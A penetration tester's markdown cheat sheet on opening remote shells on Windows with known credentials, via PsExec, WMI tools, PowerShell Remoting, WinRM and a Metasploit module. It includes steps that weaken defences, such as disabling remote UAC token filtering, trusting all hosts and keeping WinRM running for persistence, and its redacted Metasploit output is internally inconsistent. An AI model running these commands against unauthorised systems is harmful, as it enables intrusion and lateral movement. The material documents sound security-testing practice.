# WindowsShells
Today, there are several methods that can be utilized to gain shell access on a Windows Machine once you have verified credentials.
Here I will document the various tools, methods and commands that can be used:


## PSEXEC

PSEXEC allows for remote command execution or a remote shell. PSEXEC uses ports 135 and 445 (TCP). Admin$ and IPC$ shares must also be enabled.

Open a remote shell using PSEXEC
```
psexec \\COMPUTER1 -u DOMAIN\User1 -p "PASSWORD" cmd
```

Trying to a access PSEXEC shell with the Local Admin will not work in most cases.
```
psexec \\COMPUTER1 -u .\Administrator -p "PASSWORD" cmd

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access COMPUTER1:
Access is denied.
```

Local Administrators cannot be used to remotely access the machine using PSEXEC.
There is however a UAC flag in the registry that allows you to toggle this behavior for local accounts:

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy.  
  
   0 - build filtered token (Remote UAC enabled)  
   1 - build elevated token (Remote UAC disabled)  
  
If you set the DWORD entry to 1, you will be able to connect to the admin share since the remote login is not filtered.  

## WMI Remoting

Windows Management Interface (WMI) is also an option that can be used for remote acccess into a machine.
WMISploit is a PowerShell based tool which will allow use to use WMI as a remote shell.
WMI Remoteing works over port TCP/135 (the standard port for RPC). 
It also uses a randomly assigned port between 1024-65535(TCP) for Windows 2003 and older, and 49152 - 65535(TCP) 

You can test if a remote machine has WMI enabled using the following PowerShell command:
```
Get-WmiObject -query "SELECT * FROM Win32_OperatingSystem" -ComputerName ComputerName 
Get-WmiObject Win32_Service -Credential DOMAIN\USER -Computer Fabrikam
```
or Locally:
```
Get-WmiObject -query "SELECT * FROM Win32_OperatingSystem"
```
If it works you will see a result like this:
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 17763
RegisteredUser  : jsmith
SerialNumber    : 00330-80000-00000-00000
Version         : 10.0.17763
```
Otherwise you will get an error message


```
git clone https://github.com/secabstraction/WmiSploit
Cloning into 'WmiSploit'...
remote: Enumerating objects: 61, done.
remote: Total 61 (delta 0), reused 0 (delta 0), pack-reused 61
Unpacking objects: 100% (61/61), done.

Import-Module .\Enter-WmiShell.ps1
Import-Module .\Invoke-WmiCommand.ps1
Import-Module .\Invoke-WmiShadowCopy.ps1
Import-Module .\New-WmiSession.ps1
```
Open a remote shell using WMI
```
PS C:\> Enter-WmiShell -ComputerName Server01 -UserName Administrator
```


WMIImplant is another Powerful tool that can be leveraged in this situation:
```
git clone https://github.com/FortyNorthSecurity/WMImplant
```
WMI Impant provides an interactive menu interface when you run Invoke-WMImplant:
```
Import-module WMImplant.ps1
Invoke-WMImplant
```
To run WMImplant against a remote machine you can use the following Syntax:
```
Invoke-WMImplant -ActiveUsers -ComputerName victim9 -RemoteUser .\Administrator -RemotePass badpass
Invoke-WMImplant -BasicInfo -ComputerName victim9 -RemoteUser .\Administrator -RemotePass badpass
```
Get a list of commands:
```
Invoke-WMImplant -ListCommands
```


## PowerShell Remoting
PowerShell only works if the remote machine already has PowerShell installed and if PowerShell remoting is configured to allow remote access. 
PowerShell Remoting uses the following ports:  
* TCP/5985 = HTTP  
* TCP/5986 = HTTPS  
  
As opposed to that PsExec only requires network access to the machine and administrator privileges. No agents or preinstalled server applications are required. This is especially useful when dealing with older systems such as Windows Server 2003 and Windows Vista, which don't have PowerShell installed by default.
If you need to access the operating system under the system account, PsExec is the simplest solution. A PowerShell session cannot run under a system account, unless I use PsExec for this purpose.

PowerShell Remoting must be enabled on the remote machine for this technique to work.  You can quickly check if a remote machine has powershell with the following command:  
```Test-WsMan COMPUTER```
If PowerShell Remoting is enabled you will see a message like:
```
wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0
```
Otherwise yoi will see an error message like:
```
Test-WSMan : <f:WSManFault xmlns:f="http://schemas.microsoft.com/wbem/wsman/1/wsmanfault" 
Code="2150858770" Machine="My MACHINE"><f:Message>The client cannot connect 
to the destination specified in the request. Verify that the service on the destination is 
running and is accepting requests. Consult the logs and documentation for the WS-Management 
service running on the destination, most commonly IIS or WinRM. If the destination is the WinRM 
service, run the following command on the destination to analyze and configure the WinRM service: 
"winrm quickconfig". </f:Message></f:WSManFault>
```

The following script will check a list of hosts to see if PowerShell Remoting is enabled:  
```
$dev=Import-CSV hosts.csv 
foreach ($element in $dev)
{ 
    &  echo $element.Host
    &  Test-WsMan $element.Host
}
```
The CSV file will need to have the following format with "Host" as the first line:  
_CSV File Format_  
```
Host
COMPUTERNAME1
COMPUTERNAME2
COMPUTERNAME3
```

### Starting a Remote Shell with PowerShell Remoting

Both the client and server machine must have PowerShell Remoting enabled and running
Administrator PowerShell:
```
Enable-PSRemoting -SkipNetworkProfileCheck -Force
```
Also the client and server machines must either add the opposing added to the allowed host list.
Check the list of trusted hosts:
```
Get-Item WSMan:\localhost\Client\TrustedHosts
```
Set Trusted Hosts:
```
Set-Item WSMan:\localhost\Client\TrustedHosts -Force -Value *
```
OR
```
Set-Item WSMan:\localhost\Client\TrustedHosts -Force -Concatenate -Value 192.168.10.100
```

Persistence WINRM
```
Set-Service WinRM -StartMode Automatic
```
Restart WinRM to apply changes
```
Restart-Service -Force WinRM
```
Enter-PSSession -ComputerName COMPUTERNAME1 -Credential Domain01\User01 
```
Or to run as Administrator (if you have that level of access)  
```
Enter-PSSession -ComputerName COMPUTERNAME1 -Credential Domain01\User01 -RunAsAdministrator
```
If you have a Local Administator Account that does NOT use AD to authenticate, you will need to use the following command:
```
Enter-PSSession -ComputerName COMPUTERNAME1 -Credential .\User01 -RunAsAdministrator -Authentication Negotiate
```
Often, unencrypted traffic is disabled and you will need to specify SSL information
```
Enter-PSSession -ComputerName COMPUTERNAME1 -Credential .\User01 -RunAsAdministrator -Authentication Negotiate -UseSSL
```

## WinRM

When the WinRM ports are open: HTTP (5985) or HTTPS SOAP (5986), you can perform WinRM remote commands if you have an administrator user on the remote machine.
Nmap will flag it as Microsoft-HTTPAPI/2.0:
```
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```
There is a metasploit module, which can be used to verify this:
scanner/winrm/winrm_cmd

```
msf5 > use auxiliary/scanner/winrm/winrm_cmd
msf5 auxiliary(scanner/winrm/winrm_cmd) > set RHOSTS 10.10.10.1
RHOSTS => 10.10.10.161
msf5 auxiliary(scanner/winrm/winrm_cmd) > set DOMAIN test
DOMAIN => htb
msf5 auxiliary(scanner/winrm/winrm_cmd) > set PASSWORD test
PASSWORD => s3rvice
msf5 auxiliary(scanner/winrm/winrm_cmd) > set USERNAME testuser
USERNAME => svc-alfresco
msf5 auxiliary(scanner/winrm/winrm_cmd) > run

[+]
Windows IP Configuration

Ethernet adapter Ethernet 1:

   Connection-specific DNS Suffix  . : test.test.com
   IPv6 Address. . . . . . . . . . . : 2604:3d09:984:900::f8d8
   IPv6 Address. . . . . . . . . . . : 2604:3d09:984:900:894b:5f1c:b45b:b8d
   Temporary IPv6 Address. . . . . . : 2604:3d09:984:900:d5b:d696:be85:b303
   Link-local IPv6 Address . . . . . : fe80::894b:5f1c:b45b:b8d%9
   IPv4 Address. . . . . . . . . . . : 10.10.10.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::3eb7:4bff:fe75:4bc5%9
                                       10.10.10.255

```



# REFERENCES:  
*  https://blog.quickbreach.io/ps-remote-from-linux-to-windows/
*  https://4sysops.com/archives/enable-powershell-remoting-on-a-standalone-workgroup-computer/
*  https://pentestlab.blog/2017/11/20/command-and-control-wmi/
*  https://pentestlab.blog/2018/05/15/lateral-movement-winrm/
